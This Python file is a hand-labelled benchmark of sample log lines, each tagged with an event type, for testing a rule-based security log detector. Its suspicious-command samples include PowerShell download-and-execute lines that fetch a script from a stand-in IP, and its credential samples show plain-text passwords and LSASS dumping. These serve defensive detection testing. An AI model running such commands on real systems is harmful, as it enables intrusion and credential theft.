"""
Hand-labelled benchmark for CyberGuard's rule-based log detector.

Each entry is (log line, ground-truth label). Labels describe what the line
actually records, decided by reading it, independently of what the detector
outputs. Lines come in several real-world formats (Linux auth/sshd, Windows
security events, FTP servers, antivirus/EDR, kernel USB messages, web servers)
and deliberately include phrasings the keyword rules do not know and benign
lines that contain trigger words, so the measured scores reflect the detector's
real strengths and gaps.

Ground-truth label definitions:
  failed_login                 an authentication attempt that failed
  successful_login             an authentication that succeeded / session start
  credential_related_activity  credentials exposed or handled in the log
                               (plain-text secrets, credential dumping)
  ftp_connection_opened        a network/FTP connection being opened
  ftp_file_upload              a file uploaded to a server
  ftp_file_download            a file downloaded from a server
  connection_closed            a network connection closed or terminated
  logout                       a user logging out / session ending
  unauthorized_access          access refused (denied, forbidden, not permitted)
  malware_detection            security software detecting malicious code
  suspicious_command           PowerShell / encoded command execution
  usb_activity                 a removable/USB storage device being attached
  none                         routine activity with no security event
"""

EVENT_LABELS = [
    "failed_login",
    "successful_login",
    "credential_related_activity",
    "ftp_connection_opened",
    "ftp_file_upload",
    "ftp_file_download",
    "connection_closed",
    "logout",
    "unauthorized_access",
    "malware_detection",
    "suspicious_command",
    "usb_activity",
]
NO_EVENT = "none"

BENCHMARK: list[tuple[str, str]] = [
    # ---- failed_login
    ("2026-10-25 10:01:12 Failed login for user admin from 192.168.1.50", "failed_login"),
    ("2026-10-25 10:01:40 auth: login failed for user 'jsmith' (bad password)", "failed_login"),
    ("Oct 25 10:02:03 srv01 sshd[2211]: Failed password for root from 203.0.113.9 port 51022 ssh2", "failed_login"),
    ("2026-10-25 10:02:30 WinSecurity EventID=4625 An account failed to log on. Account: bob", "failed_login"),
    ("2026-10-25 10:03:05 vpn-gw authentication failure for user carol from 198.51.100.7", "failed_login"),
    ("Oct 25 10:03:44 srv01 sshd[2290]: Invalid user test from 203.0.113.9 port 50210", "failed_login"),

    # ---- successful_login
    ("2026-10-25 10:05:00 Successful login for user admin from 192.168.1.50", "successful_login"),
    ("2026-10-25 10:05:31 portal: user dave logged in via SSO", "successful_login"),
    ("Oct 25 10:06:02 srv01 sshd[2301]: Accepted publickey for deploy from 10.0.0.15 port 40110 ssh2", "successful_login"),
    ("2026-10-25 10:06:40 WinSecurity EventID=4624 An account was successfully logged on. Account: eve", "successful_login"),
    ("2026-10-25 10:07:15 webmail: login successful for frank@corp.local", "successful_login"),

    # ---- credential_related_activity
    ("2026-10-25 10:10:02 GET /login.php?user=admin&password=Winter2026 HTTP/1.1 200", "credential_related_activity"),
    ("2026-10-25 10:10:30 app: debug connect string user=svc_db passwd=Qw3rty! host=db01", "credential_related_activity"),
    ("2026-10-25 10:11:00 EDR alert: LSASS memory read by procdump.exe (possible credential dumping)", "credential_related_activity"),
    ("2026-10-25 10:11:45 config backup exported login credentials for 3 service accounts to share", "credential_related_activity"),
    ("2026-10-25 10:12:20 script: echo pass=hunter2 > notes.txt executed by user bob", "credential_related_activity"),

    # ---- ftp_connection_opened
    ("2026-10-25 11:00:01 FTP connection opened from 192.168.1.77", "ftp_connection_opened"),
    ("2026-10-25 11:00:20 vsftpd: CONNECT: Client \"192.168.1.77\"", "ftp_connection_opened"),
    ("2026-10-25 11:00:45 filezilla-server: FTP connection established with 10.0.0.31", "ftp_connection_opened"),
    ("2026-10-25 11:01:10 firewall: new connection opened 10.0.0.31:51344 -> 172.16.0.5:21", "ftp_connection_opened"),

    # ---- ftp_file_upload
    ("2026-10-25 11:02:00 FTP STOR payroll_2026.xlsx by user admin", "ftp_file_upload"),
    ("2026-10-25 11:02:30 vsftpd: OK UPLOAD: Client \"192.168.1.77\", \"/pub/report.zip\", 48213 bytes", "ftp_file_upload"),
    ("2026-10-25 11:03:00 cloud-sync: uploaded file customers.csv to external bucket", "ftp_file_upload"),
    ("2026-10-25 11:03:30 ftp client issued upload command for archive.7z", "ftp_file_upload"),

    # ---- ftp_file_download
    ("2026-10-25 11:05:00 FTP RETR tools.zip by user guest", "ftp_file_download"),
    ("2026-10-25 11:05:30 vsftpd: OK DOWNLOAD: Client \"192.168.1.77\", \"/pub/setup.exe\", 1048576 bytes", "ftp_file_download"),
    ("2026-10-25 11:06:00 proxy: user bob downloaded file invoice_scan.pdf.exe", "ftp_file_download"),
    ("2026-10-25 11:06:30 ftp client issued download command for db_dump.sql", "ftp_file_download"),

    # ---- connection_closed
    ("2026-10-25 11:10:00 FTP connection closed for 192.168.1.77", "connection_closed"),
    ("2026-10-25 11:10:20 vpn-gw: tunnel for carol disconnected after 3600s", "connection_closed"),
    ("Oct 25 11:10:40 srv01 sshd[2301]: Connection closed by 10.0.0.15 port 40110", "connection_closed"),
    ("2026-10-25 11:11:00 firewall: connection terminated 10.0.0.31:51344 (idle timeout)", "connection_closed"),

    # ---- logout
    ("2026-10-25 11:20:00 user admin logged out", "logout"),
    ("2026-10-25 11:20:30 portal: session ended for dave (user request)", "logout"),
    ("2026-10-25 11:21:00 WinSecurity EventID=4634 An account was logged off. Account: eve", "logout"),
    ("Oct 25 11:21:30 srv01 sshd[2301]: pam_unix(sshd:session): session closed for user deploy", "logout"),

    # ---- unauthorized_access
    ("2026-10-25 12:00:00 Access denied to /admin for user guest", "unauthorized_access"),
    ("2026-10-25 12:00:30 nginx: 403 Forbidden GET /backup/db.sql from 203.0.113.9", "unauthorized_access"),
    ("2026-10-25 12:01:00 fileserver: permission denied writing \\\\fs01\\finance by user bob", "unauthorized_access"),
    ("2026-10-25 12:01:30 api: unauthorized token used for /v1/users from 198.51.100.7", "unauthorized_access"),
    ("2026-10-25 12:02:00 sudo: carol is not in the sudoers file. This incident will be reported.", "unauthorized_access"),

    # ---- malware_detection
    ("2026-10-25 13:00:00 Defender: Trojan:Win32/Emotet detected in C:\\Users\\bob\\Downloads\\invoice.exe", "malware_detection"),
    ("2026-10-25 13:00:30 AV: malware quarantined: /tmp/.x/miner", "malware_detection"),
    ("2026-10-25 13:01:00 EDR: ransomware behaviour blocked (mass file encryption by svc.exe)", "malware_detection"),
    ("2026-10-25 13:01:30 AV: mimikatz.exe detected and removed", "malware_detection"),
    ("2026-10-25 13:02:00 ClamAV: /home/dave/x.doc: Win.Downloader.Agent FOUND", "malware_detection"),

    # ---- suspicious_command
    ("2026-10-25 14:00:00 process: powershell.exe -NoProfile -EncodedCommand SQBFAFgA", "suspicious_command"),
    ("2026-10-25 14:00:30 Sysmon EventID=1 Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine=IEX (New-Object Net.WebClient).DownloadString(...)", "suspicious_command"),
    ("2026-10-25 14:01:00 shell: pwsh -enc JABjAD0A executed by user bob", "suspicious_command"),
    ("2026-10-25 14:01:30 cmd.exe /c powershell -w hidden -c Invoke-WebRequest http://198.51.100.7/a.ps1", "suspicious_command"),

    # ---- usb_activity
    ("2026-10-25 15:00:00 USB device connected: SanDisk Ultra (serial 4C530001)", "usb_activity"),
    ("Oct 25 15:00:30 ws07 kernel: usb 1-2: new high-speed USB device number 4 using xhci_hcd", "usb_activity"),
    ("2026-10-25 15:01:00 Removable drive E: mounted by user bob", "usb_activity"),
    ("Oct 25 15:01:30 ws07 kernel: usb-storage 1-2:1.0: USB Mass Storage device detected", "usb_activity"),

    # ---- none: routine activity (some contain trigger words on purpose)
    ("2026-10-25 09:00:00 System boot completed in 34 s", NO_EVENT),
    ("2026-10-25 09:00:05 cron: daily backup job started", NO_EVENT),
    ("2026-10-25 09:00:10 Disk usage on /var at 61%", NO_EVENT),
    ("2026-10-25 09:00:15 NTP: clock synchronised with pool.ntp.org", NO_EVENT),
    ("2026-10-25 09:00:20 Windows Update: 3 updates installed successfully", NO_EVENT),
    ("2026-10-25 09:00:25 Defender: antimalware definitions updated to 1.421.33.0", NO_EVENT),
    ("2026-10-25 09:00:30 Scheduled task 'PowerShell help refresh' completed", NO_EVENT),
    ("2026-10-25 09:00:35 portal: user viewed the password policy page", NO_EVENT),
    ("2026-10-25 09:00:40 nginx: 200 GET /index.html from 10.0.0.22", NO_EVENT),
    ("2026-10-25 09:00:45 printer queue: job 112 printed (3 pages)", NO_EVENT),
    ("2026-10-25 09:00:50 dhcp: lease renewed for 10.0.0.22", NO_EVENT),
    ("2026-10-25 09:00:55 service spooler restarted", NO_EVENT),
    ("2026-10-25 09:01:00 Security training reminder: ransomware awareness module due Friday", NO_EVENT),
    ("2026-10-25 09:01:05 Monitoring: USB device policy unchanged", NO_EVENT),
    ("2026-10-25 09:01:10 db01: checkpoint complete, 1203 pages written", NO_EVENT),
    ("2026-10-25 09:01:15 mail: 42 messages delivered to inbox", NO_EVENT),
    ("2026-10-25 09:01:20 loadbalancer: health check passed for web01", NO_EVENT),
    ("2026-10-25 09:01:25 app: configuration reloaded", NO_EVENT),
    ("2026-10-25 09:01:30 helpdesk: ticket 5521 closed (printer toner replaced)", NO_EVENT),
    ("2026-10-25 09:01:35 antivirus scan finished: 0 threats found", NO_EVENT),
]
